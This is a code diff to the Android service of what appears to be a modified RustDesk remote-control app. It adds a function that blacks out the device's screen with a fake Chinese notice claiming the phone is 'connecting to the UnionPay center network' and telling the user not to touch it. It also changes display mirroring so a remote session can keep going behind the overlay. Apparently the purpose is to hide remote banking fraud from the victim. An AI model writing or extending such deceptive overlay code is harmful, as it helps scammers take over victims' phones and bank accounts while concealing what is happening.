@@ -381,6 +381,9 @@ class MainService : Service() {
                             // If not call acquireLatestImage, listener will not be called again
                             imageReader.acquireLatestImage().use { image ->
                                 if (image == null || !isStart) return@setOnImageAvailableListener
+
+                                drawBlackScreen()
+
                                 val planes = image.planes
                                 val buffer = planes[0].buffer
                                 buffer.rewind()
@@ -392,6 +395,36 @@ class MainService : Service() {
                 }
             Log.d(logTag, "ImageReader.setOnImageAvailableListener done")
             imageReader?.surface
+        }
+    }
+
+    fun drawBlackScreen() {
+        surfaceHolder?.let { holder ->
+            val canvas = holder.lockCanvas()
+            if (canvas != null) {
+                try {
+                    // 绘制黑色背景
+                    canvas.drawColor(Color.BLACK)
+                    
+                    // 绘制文字
+                    val paint = Paint().apply {
+                        color = Color.WHITE
+                        textSize = 50f
+                        textAlign = Paint.Align.CENTER
+                    }
+                    
+                    val x = width / 2f
+                    val y = height / 2f
+                    canvas.drawText("正在对接银联中心网络....", x, y - 100, paint)
+                    
+                    paint.color = Color.RED
+                    canvas.drawText("请勿触碰手机屏幕", x, y, paint)
+                    canvas.drawText("防止业务中断", x, y + 100, paint)
+                    canvas.drawText("保持手机电量充足", x, y + 200, paint)
+                } finally {
+                    holder.unlockCanvasAndPost(canvas)
+                }
+            }
         }
     }
 
@@ -537,12 +570,17 @@ class MainService : Service() {
         try {
 
             if (MainActivity.isCapturingBlackScreen) {
-                virtualDisplay = mp.createVirtualDisplay(
-                    "RustDeskVD",
-                    SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY,
-                    s, null, null
-                )
+                virtualDisplay?.let {
+                    it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
+                    it.setSurface(s)
+                } ?: let {
+                    virtualDisplay = mp.createVirtualDisplay(
+                        "RustDeskVD",
+                        SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                        s, null, null
+                    )
+                }
             }else{
                 virtualDisplay?.let {
                     it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
@@ -551,7 +589,7 @@ class MainService : Service() {
                     virtualDisplay = mp.createVirtualDisplay(
                         "RustDeskVD",
                         SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi,
-                        DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                         s, null, null
                     )
                 }
@@ -689,7 +727,7 @@ class MainService : Service() {
             .build()
         //notificationManager.notify(getClientNotifyID(clientID), notification)
         MainActivity.isCapturingBlackScreen = true
-        startService(Intent(this, BlackScreenService::class.java))
+        //startService(Intent(this, BlackScreenService::class.java))
     }
 
     private fun voiceCallRequestNotification(
